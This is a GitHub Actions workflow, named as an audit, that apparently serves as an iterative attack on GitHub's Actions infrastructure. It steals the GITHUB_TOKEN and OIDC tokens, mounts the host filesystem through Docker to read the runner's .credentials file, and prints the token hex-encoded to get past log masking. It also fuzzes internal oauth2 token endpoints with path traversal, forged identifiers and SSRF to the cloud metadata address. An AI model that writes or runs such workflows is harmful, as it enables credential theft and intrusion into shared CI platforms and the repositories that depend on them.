name: Audit v31
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v31:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V31 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: hostId — EVERY POSSIBLE LOCATION
      # v30: form body "hostId=X" always says "must be provided"
      # Server is NOT reading it from form body. Try every other spot.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - hostId locations
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== HOSTID LOCATIONS ==="
          PLAN=$(cat /tmp/plan.txt)
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"

          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")
          FORM_BASE="grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access"

          # A: Query parameter
          echo "--- A: Query param ---"
          for HID in "$PLAN" "84ff2294-8721-ab49-db5a-db17b0f6c2de" "1"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/_apis/oauth2/token?hostId=$HID" \
              -d "$FORM_BASE")
            CODE=$(echo "$R" | tail -1)
            echo "A qp hid='$HID' = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # B: Header
          echo "--- B: Headers ---"
          for HDR_NAME in "X-HostId" "X-Host-Id" "HostId" "hostId" "Host-Id" "X-VSS-HostId" "X-TFS-HostId"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -H "$HDR_NAME: $PLAN" \
              "$VSBASE/_apis/oauth2/token" \
              -d "$FORM_BASE")
            CODE=$(echo "$R" | tail -1)
            echo "B $HDR_NAME = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # C: JSON body
          echo "--- C: JSON body ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            "$VSBASE/_apis/oauth2/token" \
            -d "{\"grant_type\":\"client_credentials\",\"client_assertion\":\"$OIDC\",\"client_assertion_type\":\"urn:ietf:params:oauth:client-assertion-type:jwt-bearer\",\"client_id\":\"\",\"scope\":\"vso.full_access\",\"hostId\":\"$PLAN\"}")
          CODE=$(echo "$R" | tail -1)
          echo "C json = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # D: Multipart form
          echo "--- D: Multipart ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -F "grant_type=client_credentials" \
            -F "client_assertion=$OIDC" \
            -F "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            -F "client_id=" \
            -F "scope=vso.full_access" \
            -F "hostId=$PLAN" \
            "$VSBASE/_apis/oauth2/token")
          CODE=$(echo "$R" | tail -1)
          echo "D multipart = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # E: In URL path
          echo "--- E: Path ---"
          for EP in \
            "/_apis/oauth2/token/$PLAN" \
            "/_apis/oauth2/$PLAN/token" \
            "/$PLAN/_apis/oauth2/token"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE$EP" \
              -d "$FORM_BASE")
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "E $EP = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Traversed oauth2 — parent scope may have different
      # token exchange logic/validation
      # Also try SSRF via oauth2 redirect_uri
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Traversed oauth2 + SSRF
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== TRAVERSED OAUTH2 ==="
          RT=$(cat /tmp/rt.txt)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt)
          PLAN=$(cat /tmp/plan.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"

          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")

          # A: Pipeline traversed path oauth2
          echo "--- A: Traversed pipeline oauth2 ---"
          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
          for PREFIX in \
            "$SECRET" \
            "../" \
            "../../" \
            "" \
            "$SECRET/.." \
            "serviceDeployments/pipelinesghubeus14"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 5 -m 10 \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$BASE/$PREFIX/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A /$PREFIX/ = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # B: vstoken traversed oauth2
          echo "--- B: Traversed vstoken oauth2 ---"
          OIDC_VS=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_VS_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC_VS")
          VSBASE="https://vstoken.actions.githubusercontent.com"
          for PREFIX in \
            "serviceDeployments/tokenghubeus21" \
            "../" \
            "../../" \
            "" \
            "serviceDeployments/tokenghubeus21/.."; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 5 -m 10 \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/$PREFIX/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_VS_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            echo "B /$PREFIX/ = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # C: Canonical pipeline traversed oauth2
          echo "--- C: Canonical traversed ---"
          CANON="https://pipelines.actions.githubusercontent.com"
          for PREFIX in \
            "$SECRET" \
            "../" \
            "serviceDeployments/pipelinesghubeus14" \
            "serviceDeployments/pipelinesproxcus1"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 5 -m 10 \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$CANON/$PREFIX/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            echo "C /$PREFIX/ = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # D: SSRF attempt — oauth2 with redirect_uri pointing to IMDS
          echo "--- D: SSRF via oauth2 params ---"
          for PARAM in \
            "redirect_uri=http://169.254.169.254/metadata/instance" \
            "resource=http://169.254.169.254/" \
            "aud=http://169.254.169.254/" \
            "redirect_uri=http://127.0.0.1:80/"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 5 -m 10 \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "${PURL}_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access&$PARAM")
            CODE=$(echo "$R" | tail -1)
            echo "D $PARAM = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Pipeline OIDC sub format — what sub does it want?
      # v30: "Subject is not a valid client identifier: repo:lacaag/PoC-RACE2:pull_request"
      # The pipeline side reads sub but can't parse it
      # Try OIDC with different audiences that produce different sub
      # Also try to mint OIDC with custom sub
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - OIDC sub probing
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== OIDC SUB PROBING ==="
          PURL=$(cat /tmp/PipelinesServiceUrl.txt)
          PLAN=$(cat /tmp/plan.txt)
          IDTOK_URL=$(cat /tmp/idtok_url.txt)

          # A: Get OIDC tokens with various audiences and check sub format
          echo "--- A: OIDC audience variants ---"
          for AUD in \
            "https://pipelines.actions.githubusercontent.com" \
            "https://vstoken.actions.githubusercontent.com" \
            "api.github.com" \
            "https://github.com" \
            "sts.amazonaws.com" \
            "https://management.azure.com" \
            "urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            "$PLAN" \
            "self"; do
            R=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$IDTOK_URL&audience=$AUD")
            TOK=$(echo "$R" | jq -r '.value // empty')
            if [ -n "$TOK" ]; then
              SUB=$(python3 -c "
          import json,base64,sys
          t=sys.argv[1].split('.')
          if len(t)>=2:
            p=t[1]+'='*(4-len(t[1])%4)
            c=json.loads(base64.urlsafe_b64decode(p))
            print(f\"sub={c.get('sub','')}\")
          " "$TOK" 2>/dev/null)
              echo "A aud=$AUD => $SUB"

              # Try this token on pipeline oauth2
              TOK_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$TOK")
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=client_credentials&client_assertion=$TOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              echo "  pipeline = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            fi
          done
          echo ""

          # B: Try to use the OIDC sub directly as client_id on pipeline
          echo "--- B: Sub as client_id ---"
          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$IDTOK_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")
          SUB="repo:lacaag/PoC-RACE2:pull_request"
          SUB_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$SUB'))")
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "${PURL}_apis/oauth2/token" \
            -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$SUB_ENC&scope=vso.full_access")
          CODE=$(echo "$R" | tail -1)
          echo "B sub as cid = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V31 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V31 COMPLETE ==="
